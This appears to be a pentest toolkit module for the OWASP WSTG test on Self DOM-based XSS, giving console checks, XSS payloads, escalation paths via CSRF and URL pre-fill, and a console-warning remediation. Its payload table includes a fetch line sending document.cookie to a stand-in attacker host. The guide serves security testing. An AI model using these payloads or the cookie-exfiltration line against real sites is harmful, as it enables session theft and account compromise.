---
name: wstg-clnt-01.1
description: "Testing for Self DOM-Based XSS"
category: client-side
owasp_id: WSTG-CLNT-01.1
version: "1.0.0"
author: cyberstrike-official
tags: [client-side, javascript, dom, cors, wstg, clnt]
tech_stack: []
cwe_ids: []
chains_with: [wstg-clnt-01, wstg-clnt-02]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost: {}
---

# wstg-clnt-01.1

## Test ID

WSTG-CLNT-01.1

## Test Name

Testing for Self DOM-Based XSS

## High-Level Description

Self DOM-Based XSS (also called Self-XSS) occurs when users are tricked into executing malicious JavaScript in their own browser context. While the attack requires social engineering, it can still lead to session theft or account compromise if combined with other vulnerabilities.

---

## What to Check

- [ ] Console paste protection
- [ ] Self-XSS warnings
- [ ] Input fields vulnerable to paste attacks
- [ ] Developer tools protections

---

## How to Test

### Step 1: Check Console Protection

```javascript
// Open browser console on target site
// Check if there's a warning message about pasting code

// Sites like Facebook show:
// "Stop! This is a browser feature intended for developers..."

// Check if console commands are restricted
console.log("test")
eval("alert(1)")
```

### Step 2: Test Input Field Exploitation

```javascript
// Test if pasting scripts in input fields triggers execution
// Some apps process pasted content unsafely

// In browser console:
document.querySelector('input[type="text"]').value = "<script>alert(1)</script>"
// Check if it gets executed when form is submitted
```

---

## Tools

| Tool                 | Purpose                                             |
| --------------------- | --------------------------------------------------- |
| **Browser DevTools**   | Check for self-XSS console warning banner            |
| **Burp Suite**         | Trace whether pasted/typed input reaches a JS sink    |
| **DOM Invader (Burp)** | Confirm the input field feeds a dangerous DOM sink    |

---

## Example Commands/Payloads

### Console warning presence check

```javascript
// Paste in DevTools console on https://{target} — a hardened app prints a
// large "Stop!" banner before this executes. Absence of a banner is a finding.
console.log("selfxss-probe")
```

### Paste-triggered payloads to test against exposed input fields

| Payload | Goal |
| ------- | ---- |
| `<script>alert(document.domain)</script>` | Confirm raw script execution on paste |
| `<img src=x onerror=alert(document.domain)>` | Confirm markup execution if `<script>` is filtered |
| `javascript:fetch('https://attacker.tld/c?c='+document.cookie)` | Simulate session-cookie exfiltration if a support/help widget evaluates pasted "code" |

### Simulated social-engineering flow (manual)

```
1. Open DevTools console on https://{target}
2. Paste: alert(document.cookie)
3. Observe whether a "Stop! This is a browser feature..." warning was shown BEFORE paste executed
4. Repeat inside any in-app "developer console" / debug panel / support chat input the app exposes
```

### Escalating self-XSS to real (attacker-triggerable) XSS

Self-XSS only matters for a report if it can be delivered to a *victim* without them typing/pasting anything themselves. Check these upgrade paths before writing it off as "requires user interaction, low severity":

```
1. CSRF: does the vulnerable input field accept data via a GET/POST request an attacker can forge
   (no CSRF token / no SameSite cookie)? If so, the "self" requirement disappears — the attacker
   submits the payload on the victim's behalf while they are authenticated.
2. Race condition / shared state: does the vulnerable value get written to a resource other users
   also load (e.g. shared draft, shared cache key, shared clipboard-sync feature)?
3. Pre-fill via URL: does the app pre-populate the "developer console"/debug field from a URL
   parameter or postMessage, turning a paste-only self-XSS into a one-click reflected/DOM XSS?
```

---

## Remediation

```javascript
// Add console warning
if (typeof console !== "undefined") {
  console.log("%cStop!", "color: red; font-size: 50px; font-weight: bold;")
  console.log("%cThis is a browser feature for developers.", "font-size: 20px;")
  console.log("%cIf someone told you to paste something here, it is likely a scam.", "font-size: 16px;")
}
```

---

## Risk Assessment

| Finding             | CVSS | Severity |
| ------------------- | ---- | -------- |
| No self-XSS warning | 3.5  | Low      |


---

## CWE Categories

| CWE ID | Title | Description |
| --- | --- | --- |
| **CWE-79** | Improper Neutralization of Input During Web Page Generation (XSS) | User-supplied input reflected/executed in the victim's own browser context |
| **CWE-1021** | Improper Restriction of Rendered UI Layers or Frames | Related to social-engineering delivery via console-paste/UI trickery |

---

## References

- [OWASP WSTG - Testing for DOM-based Cross Site Scripting (WSTG-CLNT-01)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting)
- [Facebook Engineering - Self-XSS console warning origin](https://www.facebook.com/notes/10158791693632200/)
- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

---

## Checklist

```
[ ] Console protection checked
[ ] Self-XSS warnings present
[ ] Input field paste handling tested
[ ] Findings documented
```
